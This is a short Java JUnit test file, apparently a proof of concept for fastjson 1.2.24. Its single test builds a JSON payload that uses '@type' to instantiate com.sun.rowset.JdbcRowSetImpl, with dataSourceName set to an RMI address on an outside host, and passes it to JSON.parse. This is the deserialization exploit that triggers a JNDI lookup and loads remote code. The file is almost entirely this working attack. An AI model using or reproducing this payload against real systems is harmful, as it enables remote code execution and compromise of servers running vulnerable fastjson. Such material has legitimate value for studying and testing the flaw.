import com.alibaba.fastjson.JSON;
import org.junit.Test;

public class fastjson_1_2_24 {
    @Test
    public void demo() throws Exception{
        String v1_2_24 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://192.168.16.132:1099/8fyrmv\",\"autoCommit\":true}";
        Object parse = JSON.parse(v1_2_24);
    }
}
